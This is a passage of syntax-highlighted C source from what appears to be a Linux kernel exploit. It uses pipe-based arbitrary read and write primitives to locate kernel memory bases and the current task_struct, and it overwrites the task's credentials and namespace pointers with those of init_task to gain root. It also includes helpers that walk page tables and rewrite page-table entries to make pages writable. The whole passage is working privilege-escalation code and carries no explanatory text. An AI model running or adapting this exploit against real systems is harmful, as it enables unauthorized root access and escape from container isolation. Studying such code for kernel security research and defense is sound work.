<span class=w>            </span><span class=k>break</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=n>vmemmap_base</span><span class=w> </span><span class=o>-=</span><span class=w> </span><span class=n>KASLR_GRANULARITY</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] vmemmap_base: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;0x%lx</span><span class=se>\n\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>vmemmap_base</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* now seeking for the task_struct in kernel memory */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] Seeking task_struct in memory...&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=n>prctl</span><span class=p>(</span><span class=n>PR_SET_NAME</span><span class=p>,</span><span class=w> </span><span class=s>&quot;arttnba3pwnn&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/**</span>
<span class=cm>     * For a machine with MEM less than 256M, we can simply get the:</span>
<span class=cm>     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span>
<span class=cm>     * But that&#39;s not always accurate, espacially on a machine with MEM &gt; 256M.</span>
<span class=cm>     * So we need to find another way to calculate the page_offset_base.</span>
<span class=cm>     * </span>
<span class=cm>     * Luckily the task_struct::ptraced points to itself, so we can get the</span>
<span class=cm>     * page_offset_base by vmmemap and current task_struct as we know the page.</span>
<span class=cm>     * </span>
<span class=cm>     * Note that the offset of different filed should be referred to your env.</span>
<span class=cm>     */</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>(</span><span class=n>vmemmap_base</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mh>0x40</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>

<span class=w>        </span><span class=n>comm_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>memmem</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=mh>0xf00</span><span class=p>,</span><span class=w> </span><span class=s>&quot;arttnba3pwnn&quot;</span><span class=p>,</span><span class=w> </span><span class=mi>12</span><span class=p>);</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>comm_addr</span>
<span class=w>            </span><span class=cm>/* task_struct::cred */</span>
<span class=w>            </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>comm_addr</span><span class=p>[</span><span class=mi>-2</span><span class=p>]</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>KERNEL_DIRECT_PHYSMEM_MAP_BASE</span><span class=p>)</span>
<span class=w>            </span><span class=cm>/* task_struct::real_cred */</span>
<span class=w>            </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>comm_addr</span><span class=p>[</span><span class=mi>-3</span><span class=p>]</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>KERNEL_DIRECT_PHYSMEM_MAP_BASE</span><span class=p>)</span>
<span class=w>            </span><span class=cm>/* task_struct::read_parent */</span>
<span class=w>            </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>comm_addr</span><span class=p>[</span><span class=mi>-57</span><span class=p>]</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>KERNEL_DIRECT_PHYSMEM_MAP_BASE</span><span class=p>)</span>
<span class=w>            </span><span class=cm>/* task_struct::parent */</span>
<span class=w>            </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>comm_addr</span><span class=p>[</span><span class=mi>-56</span><span class=p>]</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>KERNEL_DIRECT_PHYSMEM_MAP_BASE</span><span class=p>))</span><span class=w> </span><span class=p>{</span>

<span class=w>            </span><span class=cm>/* task_struct::read_parent */</span>
<span class=w>            </span><span class=n>parent_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>comm_addr</span><span class=p>[</span><span class=mi>-57</span><span class=p>];</span>

<span class=w>            </span><span class=cm>/* task_struct::ptraced */</span>
<span class=w>            </span><span class=n>current_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>comm_addr</span><span class=p>[</span><span class=mi>-50</span><span class=p>]</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>2528</span><span class=p>;</span>

<span class=w>            </span><span class=n>page_offset_base</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>comm_addr</span><span class=p>[</span><span class=mi>-50</span><span class=p>]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>PAGE_MASK</span><span class=p>)</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mh>0x1000</span><span class=p>;</span>
<span class=w>            </span><span class=n>page_offset_base</span><span class=w> </span><span class=o>&amp;=</span><span class=w> </span><span class=n>KASLR_MASK</span><span class=p>;</span>

<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Found task_struct on page: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;%p</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span>
<span class=w>                   </span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>(</span><span class=n>vmemmap_base</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mh>0x40</span><span class=p>));</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] page_offset_base: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;0x%lx</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span>
<span class=w>                   </span><span class=n>page_offset_base</span><span class=p>);</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[*] current task_struct&#39;s addr: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;0x%lx</span><span class=se>\n\n</span><span class=s>&quot;</span><span class=p>,</span>
<span class=w>                   </span><span class=n>current_task</span><span class=p>);</span>
<span class=w>            </span><span class=k>break</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>
<span class=p>}</span>

<span class=cm>/**</span>
<span class=cm> * @brief find the init_task and copy something to current task_struct</span>
<span class=cm>*/</span>
<span class=kt>void</span><span class=w> </span><span class=nf>privilege_escalation_by_task_overwrite</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=cm>/* finding the init_task, the final parent of every task */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] Seeking for init_task...&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(;;)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=kt>size_t</span><span class=w> </span><span class=n>ptask_page_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>parent_task</span><span class=p>);</span>

<span class=w>        </span><span class=n>tsk_buf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>((</span><span class=kt>size_t</span><span class=p>)</span><span class=w> </span><span class=n>buf</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>parent_task</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xfff</span><span class=p>));</span>

<span class=w>        </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>ptask_page_addr</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>        </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>(</span><span class=n>ptask_page_addr</span><span class=o>+</span><span class=mh>0x40</span><span class=p>),</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>[</span><span class=mi>512</span><span class=p>]);</span>

<span class=w>        </span><span class=cm>/* task_struct::real_parent */</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>parent_task</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>tsk_buf</span><span class=p>[</span><span class=mi>309</span><span class=p>])</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=k>break</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=n>parent_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tsk_buf</span><span class=p>[</span><span class=mi>309</span><span class=p>];</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>init_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>parent_task</span><span class=p>;</span>
<span class=w>    </span><span class=n>init_cred</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tsk_buf</span><span class=p>[</span><span class=mi>363</span><span class=p>];</span>
<span class=w>    </span><span class=n>init_nsproxy</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tsk_buf</span><span class=p>[</span><span class=mi>377</span><span class=p>];</span>

<span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Found init_task: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;0x%lx</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>init_task</span><span class=p>);</span>
<span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Found init_cred: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;0x%lx</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>init_cred</span><span class=p>);</span>
<span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Found init_nsproxy:&quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;0x%lx</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=n>init_nsproxy</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* now, changing the current task_struct to get the full root :) */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] Escalating ROOT privilege now...&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=n>current_task_page</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>current_task</span><span class=p>);</span>

<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>current_task_page</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>(</span><span class=n>current_task_page</span><span class=o>+</span><span class=mh>0x40</span><span class=p>),</span><span class=w> </span><span class=o>&amp;</span><span class=n>buf</span><span class=p>[</span><span class=mi>512</span><span class=p>]);</span>

<span class=w>    </span><span class=n>tsk_buf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>((</span><span class=kt>size_t</span><span class=p>)</span><span class=w> </span><span class=n>buf</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>current_task</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xfff</span><span class=p>));</span>
<span class=w>    </span><span class=n>tsk_buf</span><span class=p>[</span><span class=mi>363</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>init_cred</span><span class=p>;</span>
<span class=w>    </span><span class=n>tsk_buf</span><span class=p>[</span><span class=mi>364</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>init_cred</span><span class=p>;</span>
<span class=w>    </span><span class=n>tsk_buf</span><span class=p>[</span><span class=mi>377</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>init_nsproxy</span><span class=p>;</span>

<span class=w>    </span><span class=n>arbitrary_write_by_pipe</span><span class=p>((</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>current_task_page</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=mh>0xff0</span><span class=p>);</span>
<span class=w>    </span><span class=n>arbitrary_write_by_pipe</span><span class=p>((</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>(</span><span class=n>current_task_page</span><span class=o>+</span><span class=mh>0x40</span><span class=p>),</span>
<span class=w>                            </span><span class=o>&amp;</span><span class=n>buf</span><span class=p>[</span><span class=mi>512</span><span class=p>],</span><span class=w> </span><span class=mh>0xff0</span><span class=p>);</span>

<span class=w>    </span><span class=n>log_success</span><span class=p>(</span><span class=s>&quot;[+] Done.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] checking for root...&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=n>get_root_shell</span><span class=p>();</span>
<span class=p>}</span>

<span class=cp>#define PTE_OFFSET 12</span>
<span class=cp>#define PMD_OFFSET 21</span>
<span class=cp>#define PUD_OFFSET 30</span>
<span class=cp>#define PGD_OFFSET 39</span>

<span class=cp>#define PT_ENTRY_MASK 0b111111111UL</span>
<span class=cp>#define PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span>
<span class=cp>#define PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span>
<span class=cp>#define PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span>
<span class=cp>#define PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span>

<span class=cp>#define PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span>
<span class=cp>#define PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span>
<span class=cp>#define PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span>
<span class=cp>#define PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span>

<span class=cp>#define PAGE_ATTR_RW (1UL &lt;&lt; 1)</span>
<span class=cp>#define PAGE_ATTR_NX (1UL &lt;&lt; 63)</span>

<span class=kt>size_t</span><span class=w> </span><span class=n>pgd_addr</span><span class=p>,</span><span class=w> </span><span class=n>mm_struct_addr</span><span class=p>,</span><span class=w> </span><span class=o>*</span><span class=n>mm_struct_buf</span><span class=p>;</span>
<span class=kt>size_t</span><span class=w> </span><span class=n>stack_addr</span><span class=p>,</span><span class=w> </span><span class=n>stack_addr_another</span><span class=p>;</span>
<span class=kt>size_t</span><span class=w> </span><span class=n>stack_page</span><span class=p>,</span><span class=w> </span><span class=n>mm_struct_page</span><span class=p>;</span>

<span class=kt>size_t</span><span class=w> </span><span class=nf>vaddr_resolve</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>pgd_addr</span><span class=p>,</span><span class=w> </span><span class=kt>size_t</span><span class=w> </span><span class=n>vaddr</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>pud_addr</span><span class=p>,</span><span class=w> </span><span class=n>pmd_addr</span><span class=p>,</span><span class=w> </span><span class=n>pte_addr</span><span class=p>,</span><span class=w> </span><span class=n>pte_val</span><span class=p>;</span>

<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>pgd_addr</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>pud_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>PGD_ENTRY</span><span class=p>(</span><span class=n>vaddr</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>))</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>PAGE_ATTR_NX</span><span class=p>);</span>
<span class=w>    </span><span class=n>pud_addr</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>page_offset_base</span><span class=p>;</span>

<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>pud_addr</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>pmd_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>PUD_ENTRY</span><span class=p>(</span><span class=n>vaddr</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>))</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>PAGE_ATTR_NX</span><span class=p>);</span>
<span class=w>    </span><span class=n>pmd_addr</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>page_offset_base</span><span class=p>;</span>

<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>pmd_addr</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>pte_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>PMD_ENTRY</span><span class=p>(</span><span class=n>vaddr</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>))</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>PAGE_ATTR_NX</span><span class=p>);</span>
<span class=w>    </span><span class=n>pte_addr</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>page_offset_base</span><span class=p>;</span>

<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>pte_addr</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>pte_val</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>PTE_ENTRY</span><span class=p>(</span><span class=n>vaddr</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>))</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>PAGE_ATTR_NX</span><span class=p>);</span>

<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>pte_val</span><span class=p>;</span>
<span class=p>}</span>

<span class=kt>size_t</span><span class=w> </span><span class=nf>vaddr_resolve_for_3_level</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>pgd_addr</span><span class=p>,</span><span class=w> </span><span class=kt>size_t</span><span class=w> </span><span class=n>vaddr</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>pud_addr</span><span class=p>,</span><span class=w> </span><span class=n>pmd_addr</span><span class=p>;</span>

<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>pgd_addr</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>pud_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>PGD_ENTRY</span><span class=p>(</span><span class=n>vaddr</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>))</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>PAGE_ATTR_NX</span><span class=p>);</span>
<span class=w>    </span><span class=n>pud_addr</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>page_offset_base</span><span class=p>;</span>

<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>pud_addr</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>pmd_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>PUD_ENTRY</span><span class=p>(</span><span class=n>vaddr</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>))</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>PAGE_ATTR_NX</span><span class=p>);</span>
<span class=w>    </span><span class=n>pmd_addr</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>page_offset_base</span><span class=p>;</span>

<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>pmd_addr</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>PMD_ENTRY</span><span class=p>(</span><span class=n>vaddr</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>))</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>PAGE_ATTR_NX</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>void</span><span class=w> </span><span class=nf>vaddr_remapping</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>pgd_addr</span><span class=p>,</span><span class=w> </span><span class=kt>size_t</span><span class=w> </span><span class=n>vaddr</span><span class=p>,</span><span class=w> </span><span class=kt>size_t</span><span class=w> </span><span class=n>paddr</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>pud_addr</span><span class=p>,</span><span class=w> </span><span class=n>pmd_addr</span><span class=p>,</span><span class=w> </span><span class=n>pte_addr</span><span class=p>;</span>

<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>pgd_addr</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>pud_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>PGD_ENTRY</span><span class=p>(</span><span class=n>vaddr</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>))</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>PAGE_ATTR_NX</span><span class=p>);</span>
<span class=w>    </span><span class=n>pud_addr</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>page_offset_base</span><span class=p>;</span>

<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>pud_addr</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>pmd_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>PUD_ENTRY</span><span class=p>(</span><span class=n>vaddr</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>))</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>PAGE_ATTR_NX</span><span class=p>);</span>
<span class=w>    </span><span class=n>pmd_addr</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>page_offset_base</span><span class=p>;</span>

<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>pmd_addr</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>pte_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>PMD_ENTRY</span><span class=p>(</span><span class=n>vaddr</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>))</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>PAGE_ATTR_NX</span><span class=p>);</span>
<span class=w>    </span><span class=n>pte_addr</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>page_offset_base</span><span class=p>;</span>

<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>pte_addr</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>buf</span><span class=p>[</span><span class=n>PTE_ENTRY</span><span class=p>(</span><span class=n>vaddr</span><span class=p>)]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>paddr</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mh>0x8000000000000867</span><span class=p>;</span><span class=w> </span><span class=cm>/* mark it writable */</span>
<span class=w>    </span><span class=n>arbitrary_write_by_pipe</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>pte_addr</span><span class=p>),</span><span class=w> </span><span class=n>buf</span><span class=p>,</span>
<span class=w>                            </span><span class=mh>0xff0</span><span class=p>);</span>
<span class=p>}</span>

